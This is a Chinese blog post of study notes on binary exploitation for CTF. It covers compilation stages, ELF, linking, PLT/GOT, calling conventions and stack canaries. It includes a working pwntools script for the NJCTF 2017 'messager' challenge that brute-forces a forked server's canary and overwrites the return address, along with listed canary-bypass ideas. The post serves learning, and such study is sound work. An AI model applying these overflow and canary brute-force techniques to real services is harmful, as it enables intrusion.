<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>ctf-guide-pwn-1 | wd-z711&#39;s B10g</title>
  <meta name="author" content="wd-z711">
  
  <meta name="description" content="Common student in China. Interested in web &amp; re.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="ctf-guide-pwn-1"/>
  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-YHJSKZDC3Y', 'auto');
  ga('send', 'pageview');
</script>




<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> ctf-guide-pwn-1</h1>
		</div>
	



<div class="row post">

	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="CTF-竞赛权威指南-PWN"><a href="#CTF-竞赛权威指南-PWN" class="headerlink" title="CTF 竞赛权威指南-PWN"></a>CTF 竞赛权威指南-PWN</h1><h2 id="0x00-二进制文件"><a href="#0x00-二进制文件" class="headerlink" title="0x00 二进制文件"></a>0x00 二进制文件</h2><h3 id="4-个阶段"><a href="#4-个阶段" class="headerlink" title="4 个阶段"></a>4 个阶段</h3><p>&emsp;通过在 gcc 编译过程中加入 -save-temps（生成编译过程中的中间文件） 与 —verbose（查看 gcc 编译的详细工作流程） 选项，可以看出 gcc 编译分为 4 个阶段，分别为<code>预处理、编译、汇编、链接</code>。</p>
<span id="more"></span>
<ul>
<li>使用 cc1 编译器将 xx.c 编译为 xx.s（预处理+编译）。</li>
<li>使用 as 汇编器（汇编）将 xx.s 汇编为 xx.o。</li>
<li>使用 collect2 链接器将 c 语言运行时库（CRT）中的目标文件以及所需的动态链接库链接起来</li>
</ul>
<h4 id="预处理阶段"><a href="#预处理阶段" class="headerlink" title="预处理阶段"></a>预处理阶段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E xx.c -o xx.i</span><br></pre></td></tr></table></figure>
<p>&emsp;处理 # 开头的指令，例如 #include，#define。预处理阶段将其处理后直接插入到程序文本中，得到另一个 c 程序（xx.i）。注释删除阶段也是在此流程进行的。</p>
<h4 id="编译阶段"><a href="#编译阶段" class="headerlink" title="编译阶段"></a>编译阶段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S xx.i -o xx.s</span><br></pre></td></tr></table></figure>
<p>&emsp;Linux gcc 编译过程：</p>
<ul>
<li>词法分析：输入源程序的字符流，输出有意义的词素（lexeme）。</li>
<li>语法分析：根据词法单元的第一个分量创建语法树。</li>
<li>语义分析：使用语法树与符号表，检测源程序是否满足语言定义的语义约束。</li>
<li>中间代码生成与优化：生成类似于机器语言的中间表示，例如三地址码，然后对其进行优化。</li>
<li>代码生成与优化：将中间表示映射到目标机器语言。</li>
</ul>
<h4 id="汇编阶段"><a href="#汇编阶段" class="headerlink" title="汇编阶段"></a>汇编阶段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c xx.s -o xx.o</span><br></pre></td></tr></table></figure>
<p>&emsp;根据汇编指令与机器指令的对照表进行翻译，生成一个可重定位文件。此时与正常 ELF 不同的点在于：</p>
<ul>
<li>传递参数的寄存器的值没有设置。</li>
<li>call function 中 function 并没有进行设置。</li>
</ul>
<h4 id="链接阶段"><a href="#链接阶段" class="headerlink" title="链接阶段"></a>链接阶段</h4><p>&emsp;将目标文件与其所依赖的库进行链接，修正其符号地址。</p>
<h4 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h4><ul>
<li>gcc -masm=intel 选项。 gcc 默认使用 AT&amp;T 的汇编语言，其格式为：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movl $4, %eax </span><br><span class="line">movl $1, %ebx</span><br></pre></td></tr></table></figure>
<p>&emsp;在此我们将其设置为 intel 格式的汇编，其格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 4</span><br><span class="line">mov ebx, 1</span><br></pre></td></tr></table></figure>
<ul>
<li>gcc -fno-asynchronous-unwind-tables 选项。生成没有 cfi 宏的汇编指令。 cfi （Control Flow Integrity）宏是一种防止攻击者利用程序中的漏洞来篡改程序的控制流，它通过向程序中写入某些代码，来在函数开头与结尾时做 check，例如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void foo() &#123;</span><br><span class="line">  CFI_START(foo); </span><br><span class="line">  // 函数体</span><br><span class="line">  CFI_END(foo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;它可以使用 LLVM 的 SafeStack 或者 Windows 的 Control Flow Guard 来实现。其本质上就是，在函数体中，如果有跳转的话，就会检查跳转目标地址的合法性。</p>
<h3 id="ELF-文件格式"><a href="#ELF-文件格式" class="headerlink" title="ELF 文件格式"></a>ELF 文件格式</h3><p>&emsp;ELF 最初是作为应用程序二进制接口 ABI 的一部分发布的。ELF 有 3 种文件类型，分别为 exec（可执行文件，对应 .exe）、rel（可重定位文件，对应 .o，通常是位置独立 PIC 的代码，用于与其他目标文件链接以构成可执行文件）、dyn（共享目标文件，对应 .dll）。</p>
<p>&emsp;有两种视角可以审视一个 ELF 文件，分别为链接视角（通过 section 来划分）与运行视角（通过 segment 来划分）。链接视角一般包含代码（.text）、数据（.data）与 BSS（保存未初始化的全局变量与局部静态变量） 三个节。运行视角就是就是程序运行时的内存状态。两种视角其实就是静态与动态。</p>
<h4 id="链接视角"><a href="#链接视角" class="headerlink" title="链接视角"></a>链接视角</h4><p>&emsp;ELF header 描述了 ELF 文件类型，版本，目标机器，程序入口，段表/节表的位置。开头的 magic 为 <code>\177ELF</code>。</p>
<p>&emsp;另外，还有 section header table，其中每一项都是节描述符（ELF64_Shdr），记录了每个节的名称，长度，偏移，读写权限。它不是必须的，所以有的程序把它删除，增加分析难度。除了这些之外，还有一些比较重要的 section:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.got      | 全局偏移量表，保存全局变量引用的地址</span><br><span class="line">.got.plt  | 保存函数引用的地址</span><br><span class="line">.plt      | 过程链接表，用于延迟绑定</span><br><span class="line">.rela.dyn | 变量的动态重定位</span><br><span class="line">.rela.plt | 函数的动态重定位</span><br><span class="line">.symtab   | 符号表</span><br></pre></td></tr></table></figure>
<p>&emsp;重定位是<code>连接符号定义与符号引用的过程</code>。可重定位文件需要把节中的符号引用转换成符号在进程中的虚拟地址。</p>
<h4 id="运行视角"><a href="#运行视角" class="headerlink" title="运行视角"></a>运行视角</h4><p>&emsp;当运行可执行文件时，需要将文件与动态链接库装载到进程空间中，形成进程映像。这个映像如何布局是由 ELF header 中 e_phoff（Program header table offset）决定的。每一个 segment 对应一个或多个 section。根据 section 的权限对不同权限的节分组，并同时装载多个节。</p>
<p>&emsp;一个可执行文件至少有一个 PT_LOAD 类型的段，用于描述可装载的节。PT_DYNAMIC 段包含一些动态链接器所必需的信息，例如 GOT 表、重定位表等。</p>
<h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><p>&emsp;链接是将<code>多个不同的目标文件组合成一个可执行文件</code>，包括<code>编译时链接、加载时链接与运行时链接</code>。多个目标文件的组合使用相似节合并的方法，即文件 A 的 .data 与 B 的 .data 合并。具体来说，链接器首先对各个节进行分析，将 A 与 B 中符号表的符号定义与符号引用统一生成全局符号表，最后对符号表进行重定位（放到其该有的位置，在这个步骤中进行相似节合并）。</p>
<p>&emsp;链接器要完成：（1）符号解析，<code>将符号的引用与其定义进行关联</code>。（2）重定位，<code>将符号定义与内存地址进行关联，然后修改符号的的引用，使其指向某个内存地址</code>。.o 文件还没进行链接，因此其虚拟地址 VMA 表示为 0，链接后就正常了。</p>
<p>&emsp;.o 文件是可重定位文件，其中包含重定位表，用于帮助链接器如何修改节的内容，每一个节都有一个重定位表，例如 .rel.text 的节用于保存 .text 的重定位表，其中 shared 类型用于绝对寻址，func 类型用于相对寻址。</p>
<p>&emsp;Linux 中静态链接库后缀为 .a，一个静态链接库为一组目标文件经过压缩打包的集合。使用 ar 工具可以对 .o 文件进行打包，生成 .a 文件。</p>
<h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>&emsp;静态链接的缺点：<code>如果对标准函数做出微小改动，都需要重新编译整个源文件</code>。动态链接：<code>在程序运行或加载时，在内存中完成的链接</code>。GCC 默认使用动态链接，如果要生成一个动态链接库（共享库），那么指令为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fpic -o func.so func.c</span><br></pre></td></tr></table></figure>
<p>&emsp;其中，-fpic 指的是位置无关代码，也就是<code>可以加载而无需重定位的代码</code>。通过 PIC，共享库的代码可以被无限多个进程共享。由于程序的数据段与代码段的相对距离总是保持不变的，因此指令与变量之间的距离是运行时常量，与绝对地址无关。<code>因此，就会有全局偏移量表（GOT）的产生，此表位于数据表开头，用于保存全局变量的引用，在加载时会进行重定位给并填入符号的绝对地址。</code></p>
<p>&emsp;实际上，执行中会有保护机制 RELRO，此时 GOT 拆分为 .got 节（变量偏移表）和 .got.plt 节（函数偏移表），.got 不需要延迟绑定，加载到内存之后就是只读，.got.plt 需要延迟绑定，加载到内存之后有读写权限。给一个 GOT 表的例子：</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240401190637418.png" alt="image-20240401190637418" style="zoom:67%;" /></p>
<p>&emsp;延迟绑定：<code>动态链接是由动态链接器在程序加载时进行的，当需要重定位的符号很多时，会影响性能，因此有了延迟绑定，即当函数第一次被调用时，动态链接器才进行符号查找</code>。ELF 使用 PLT（过程链接表） 与 GOT 来实现延迟绑定，每一个库函数都有自己的 PLT 与 GOT。</p>
<p>&emsp;PLT 位于 .plt 节（代码段）中，是一个数组。PLT[0] 用于跳转到动态链接器（也是作为一个动态链接库存在），PLT[1] 用于调用系统启动函数 libc_start_main（main 函数就是在这里面调用），之后就是被调用的各个函数。</p>
<p>&emsp;GOT 位于 .got.plt 节（数据段），也是一个数组。GOT[0] 和 GOT[1] 包含动态链接器在解析函数地址时所需要的两个地址（.dynamic 和 relor)，GOT[2] 是动态链接器 ld-linux.so 的入口点，从 GOT[3] 开始就是被调用的各个函数条目，完成绑定后才会被修改为函数的实际地址。</p>
<p>&emsp;举个例子：</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240401192124709.png" alt="image-20240401192124709" style="zoom:67%;" /></p>
<p>&emsp;执行 call 指令会进入 func@plt（PLT），jmp 指令找到对应的 GOT 条目，这时该位置保存的还是 <code>push 1</code>，于是执行第二条指令，然后进入 PLT[0]。PLT[0] 先将 GOT[1] 压栈，然后调用 GOT[2]（_dl_runtime_resolve），完成符号解析和重定位工作，并将 func 的真实地址填入 func@got.plt，也就是 GOT[4]，最后才把控制权交给 func。延迟绑定完成后，如果再调用 func，就可以由 func@plt 的第一条指令直接跳转到 fnc@got.plt，将控制权交给 func。</p>
<p>&emsp;上述是传统的动态链接，也就是加载时链接。之后介绍运行时链接，需要使用 dlopen 的接口。两者的区别是：</p>
<ul>
<li>加载时链接会生成 GOT 表，记录着可能用到的所有符号。</li>
<li>运行时链接则需要在运行时定位这些符号。</li>
</ul>
<h2 id="0x01-汇编基础"><a href="#0x01-汇编基础" class="headerlink" title="0x01 汇编基础"></a>0x01 汇编基础</h2><p>&emsp;快速过一下。</p>
<ul>
<li>CPU 称为处理器，是从内存中读取指令，然后解码和执行。</li>
<li>CPU 架构就是 CPU 的内部设计和结构，由一堆硬件电路组成。</li>
<li>指令集架构（Instruction Set Architecture，ISA）称为指令集，包含了操作码 opcode，以及由特定 CPU 执行的基本命令。要想设计 CPU，首先得决定使用什么样的指令集，然后才设计硬件电路。指令集可分为<code>CISC</code>和<code>RISC</code>。</li>
<li>由于指令集不利于阅读和理解，因此发明了汇编语言（Assembly language），用人类语言的方式对指令集进行描述。</li>
</ul>
<h3 id="CISC-与-RISC"><a href="#CISC-与-RISC" class="headerlink" title="CISC 与 RISC"></a>CISC 与 RISC</h3><p>&emsp;复杂指令集计算机（Complex Instruction Set Computer，CISC），例如 x86、AMD64。在 Linux 中，将x86-64称为 amd64，而 x86 称为 i386。精简指令集计算机（Reduced Instruction SetComputer，RISC）的概念，例如 ARM、MIPS。</p>
<p>&emsp;CISC 与 RISC 相互借鉴。CISC 指令在解码阶段上向 RISC 指令转化，将后端流水线转换成类似 RISC 的形式，即等长的微操作（micro-ops），弥补了 CISC 流水线的劣势。同期，ARM 也引入了代码密度更高的 Thumb 指令集，允许混合使用 16 位指令和 32 位指令，提高了指令缓存的效率。</p>
<p>&emsp;两者的对比如下：</p>
<ul>
<li>RISC 的指令长度是固定的，对于 32 位的 ARM 处理器，所有指令都是4个字节。CISC 的指令长度是不固定的，通常在 1 到 6 个字节之间。固定长度的指令有利于解码和优化，可以实现流水线（pipeline），缺点则是平均代码长度更大，会占用更多的存储空间。指令长度不固定的话，从不同的地方开始反汇编，可能会出现不同的结果，即指令错位。</li>
<li>基于 80% 的工作由其中 20% 的指令完成的原则，RISC设计的指令数量也相对较少。CISC 为某个特定的操作专门设计一条指令，而 RISC 则需要组合多条指令来完成该操作。例如，x86 拥有专门的进栈指令 push 和出栈指令 pop,而 ARM 处理器没有这类指令，需要通过 load/store+add 等多条指令完成。</li>
<li>ARM 采用了 load/store 架构，处理器的运算指令在执行过程中只能处理立即数，或者寄存器中的数据，不能访问内存。因此，存储器和寄存器之间的数据交互，由专门 load/store 指令负责。相反，x86 既能处理寄存器中的数据，也能处理存储器中的数据，因此寻址方式也更加多样。</li>
<li>RISC 处理器需要更多的通用寄存器。ARM 通常包含 31 个通用寄存器，而 x86 只有8个，x86-64 则增加到 16 个。因此，RISC 可以完全使用寄存器来传递参数，而 CISC 则不能。</li>
</ul>
<h3 id="x86-x64-基础"><a href="#x86-x64-基础" class="headerlink" title="x86/x64 基础"></a>x86/x64 基础</h3><p>&emsp;x86-64 有 5 个操作模式：保护模式、实地址模式、系统管理模式，保护模式的子模式（称为虚拟 8086 模式）、IA-32e。</p>
<ul>
<li>保护模式。处理器的原生状态，所有的指令和特性都是可用的。为了模拟 8086 处理器，在虚拟 8086 模式下，操作系统可以在实体 CPU 中划分多个 8086 CPU（早期虚拟机）。<code>分配给程序的独立内存区域称为内存段，处理器将阻止程序使用自身段以外的内存区域</code>。</li>
<li>实地址模式。程序可以直接访问硬件及其实际内存地址，而无需虚拟内存地址的映射。</li>
<li>系统管理模式。电源管理或安全保护等特性。</li>
<li>IA-32e。该模式包含两个子模式，分别为兼容模式和 64 位模式，在兼容模式下现有的 32位和 16 位程序无须重新编译；在 64 位模式下，处理器将在 64 位的地址空间下运行程序。</li>
</ul>
<p>&emsp;MOV 指令是图灵完备的。XCHG 允许交换 2 个操作数的值。</p>
<h2 id="0x02-Linux-安全机制"><a href="#0x02-Linux-安全机制" class="headerlink" title="0x02 Linux 安全机制"></a>0x02 Linux 安全机制</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>&emsp;Linux 的 shell 一般是 bash，也可以是 zsh。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var=&quot;test&quot;     </span><br><span class="line">echo &#x27;this is $var&#x27; // 输出为 this is $var</span><br><span class="line">echo &quot;this is $var&quot; // 输出为 this is test</span><br><span class="line">echo `date`         // 执行 date 指令并输出</span><br><span class="line">ldd /file           // 输出 file 所需的依赖库</span><br></pre></td></tr></table></figure>
<p>&emsp;流可以理解成一串连续的、可边读边处理的数据，标准流(standard streams)可以分为标准输输入/标准输出/标准错误。文件描述符（file descriptor）是<code>内核为管理已打开文件所创建的索引</code>，使用一个非负整数来指代被打开的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmd &gt; file  // 重定向并覆盖</span><br><span class="line">cmd &gt;&gt; file // 重定向追加</span><br><span class="line">cmd &lt; file  // file 作为 cmd 的输入</span><br><span class="line">cmd &lt;&lt; tag  // 从标准输入读取直到遇到 tag</span><br><span class="line">cmd 2 &gt; file // cmd 的错误覆盖到 file</span><br><span class="line">2 &gt;&amp;1        // 合并标准错误与标准输出</span><br></pre></td></tr></table></figure>
<p>&emsp;UID 是用户 ID，GID 是组 ID。用 env 指令可以查看环境变量。一些特殊的环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD：定义程序运行时优先加载的动态链接库。ELF 文件的 INTERP 字段指定了解释器 ld.so 的位置，如果该路径与动态链接库的位置不匹配，则会触发错误。</span><br><span class="line">environ：libc 中定义的全局变量，指向内存中的环境变量表（栈内）。</span><br></pre></td></tr></table></figure>
<p>&emsp;每个进程都对应 /proc下的一个目录，目录名就是进程的 PID。procfs 是 Linux 内核提供的虚拟文件系统（只占用内存，不占用存储），为访问内核数据提供接口。可以通过 procfs 查看系统硬件及当前正在运行进程的信息（进程内存、段、栈等），并可以通过修改其中内容来改变内核状态。如下图所示，感觉很有用。</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240410233356130.png" alt="image-20240410233356130" style="zoom:67%;" /></p>
<p>&emsp;Intel 是小端序，TCP/IP 协议与 JVM 是大端。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace ls -l // 追踪 ls -l 运行时所运行的系统调用</span><br></pre></td></tr></table></figure>
<p>&emsp;调用约定（内核）：</p>
<ul>
<li>32 位系统调用：Linux 系统调用使用寄存器传递参数，eax 为 syscall_number，ebx、ecx、edx、esi 和 ebp 用于传递参数，返回值保存在 eax 中，使用 int 0x80 或 sysenter 进入内核态。sysenter 需要用户在用户态手动布置栈，这是因为在 sysenter 返回时，会执行 kernel_vsyscall，而 kernel_vsyscall 封装了DSO 的一部分（允许程序在用户层执行内核代码）。</li>
<li>64 位系统调用：系统调用通过 syscall 完成，系统调用的参数限制为 6 个（rdi、rsi、rdx、r10、r8、r9），不直接从堆栈上传递任何参数。</li>
</ul>
<p>&emsp;调用约定（用户）：</p>
<ul>
<li><p>32 位函数调用：参数通过栈进行传递。</p>
</li>
<li><p>64 位函数调用：顺序使用 rdi、rsi、rdx、rcx、r8、r9 传参，所以如果有多于 6 个的参数，则在栈上传递。</p>
</li>
</ul>
<h3 id="Stack-Canaries（不可更改返回地址）"><a href="#Stack-Canaries（不可更改返回地址）" class="headerlink" title="Stack Canaries（不可更改返回地址）"></a>Stack Canaries（不可更改返回地址）</h3><p>&emsp;栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。程序只需要在函数返回前检查 Canary 是否被篡改，就可以保护栈。</p>
<p><strong>3 种 Stack Canaries：</strong></p>
<ul>
<li>Terminator canaries。由于许多栈溢出都是由于字符串操作不当所产生的，而这些字符串以 0x00 结尾。因此，将低位设置为 0x00，既可以防止被泄露，也可以防止被伪造。</li>
<li>Random canaries。通常在程序初始化时随机生成，并保存在一个安全的地方。</li>
<li>Random XOR canaries。与 random canaries 类似，但多了一个 XOR 操作，这样无论是 canaries 被篡改还是 XOR 的控制数据被篡改，都会发生错误。</li>
</ul>
<p><strong>与 Stack Canaries 相关的 gcc 编译选项：</strong></p>
<ul>
<li>-fstack-protector。保护 alloca 函数和内部缓冲区大于 8 字节的函数。</li>
<li>-fstack-protector-strong。增加对局部数组定义和地址引用的函数的保护。</li>
<li>-fstack-protector-explicit。对 stack protect 属性的函数启用保护。</li>
<li>-fno-stack-protector。禁用保护。</li>
</ul>
<p><img src="/images/ctf-guide-pwn-1/1713063306747-f31f078c-d244-458a-a3a9-2b6b2c51ee38.png" alt="img"></p>
<p>&emsp;在 Linux 中，fs 寄存器被用于存放线程局部存储（Thread Local Storage，TLS），TLS 是为了避免多个线程同时访问/修改同一全局变量时所导致的冲突（TLS 为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其他线程的副本冲突，从线程的角度看，就好像每一个线程都完全拥有该变量）。在 glibc 里，TLS 结构体偏移 0x28的地方是 stackguard。如果是 32 位程序，stackguard 存放在 gs:0x14。</p>
<p><strong>Stack Canaries 具体的实现：</strong></p>
<p>&emsp;64 位程序加载时 glibc 中的 ld.so 首先初始化 TLS：</p>
<ul>
<li><p>使用 arch_prctl 系统调用分配 TLS 空间，设置 fs 寄存器指向 TLS。</p>
</li>
<li><p>调用 security_init 生成 stackguard，并放入 fs:0x28。security_init 内部逻辑为：</p>
</li>
</ul>
<ol>
<li><p>Step1：生成 Canary。进入 _dl_setup_stack_chk_guard，并根据位数生成相应的 Canary 值。为了使 Canary 具有字符截断的效果，其最低位被设置为 0x00。如果 dl_random 指针为 NULL，那么 Canary 为定值。</p>
</li>
<li><p>Step2：将 Canary 赋给 fs:0x28，或者将 Canary 赋给全局变量 __stack chk_guard（.bss 段）。使用 THREAD_SETMEM 修改线程描述符的成员。</p>
</li>
</ol>
<p><strong>绕过思路：</strong></p>
<ul>
<li>读 Canaries 的值，在栈溢出时覆盖上去，使其保持不变。</li>
<li>同时篡改 TLS 和栈上的 Canaries。</li>
</ul>
<p><strong>分析文件流程：</strong></p>
<ul>
<li>file xxx</li>
<li>pwn checksec xxx</li>
</ul>
<h4 id="NJCTF-2017-messager"><a href="#NJCTF-2017-messager" class="headerlink" title="NJCTF 2017: messager"></a>NJCTF 2017: messager</h4><p>&emsp;发现开了 canary。</p>
<p><img src="/images/ctf-guide-pwn-1/1713075310049-9d65fda0-0e7a-44b0-8fed-a2752effb3f6.png" alt="img"></p>
<p><img src="/images/ctf-guide-pwn-1/1713075340818-a96dc691-7429-4d8f-bb00-869d043aaacb.png" alt="img"></p>
<ul>
<li><p>开一个 socket，监听 5555 端口，若有连接请求就 fork 一个子进程来处理连接。</p>
</li>
<li><p>子进程接收消息（其中子进程有栈溢出漏洞），接收到之后就发送 Message received。</p>
</li>
</ul>
<p>&emsp;通常，对 Canaries 进行爆破是太可能的（虽然低位是固定的 0x00），因为会使程序崩溃。程序重启后 Canaries 会重新生成，但同一个进程内（包括子进程）的 Canaries 不会变，且子进程崩溃不会影响到主进程，因此可以爆破。思路：</p>
<ul>
<li>根据进程崩溃与否来判断填充的字节是否正确。</li>
<li>覆盖返回地址，定向到发 flag 的函数，获得 flag。（内存结构：s[104] - canary - v2 - ret，低地址到高地址）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">ord</span>(c):02x&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_canary</span>():</span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    canary = <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)</span><br><span class="line">            io.recv()</span><br><span class="line"></span><br><span class="line">            io.send(<span class="string">&quot;A&quot;</span>*<span class="number">104</span> + canary + <span class="built_in">chr</span>(x))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io.recv()</span><br><span class="line">                canary += <span class="built_in">chr</span>(x)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                io.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;canary&quot;</span>, string_to_hex(canary))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># s[104] and v2</span></span><br><span class="line">    io.send(<span class="string">&quot;A&quot;</span>*<span class="number">104</span> + canary + <span class="string">&quot;A&quot;</span>*<span class="number">8</span> + <span class="string">&quot;\xc6\x0b@\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    leak_canary()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
<h4 id="sixstars-CTF-2018：babystack"><a href="#sixstars-CTF-2018：babystack" class="headerlink" title="sixstars CTF 2018：babystack"></a>sixstars CTF 2018：babystack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector-strong -s -pthread bs.c -o bs -Wl, -z, now, -z, relro</span><br></pre></td></tr></table></figure>
<ul>
<li>-s。在生成的可执行文件中去除符号表信息和调试信息。</li>
<li>-pthread。启用 POSIX 线程库，确保编译器在预处理、编译和链接阶段正确处理多线程代码。</li>
<li>-Wl, -z, now, -z, relro。传递两个链接器选项：</li>
</ul>
<ol>
<li><ul>
<li>now。使用立即绑定模式，即在程序启动时立即解析所有动态库符号引用，而不是延迟到符号被使用时才解析。</li>
</ul>
</li>
<li><ul>
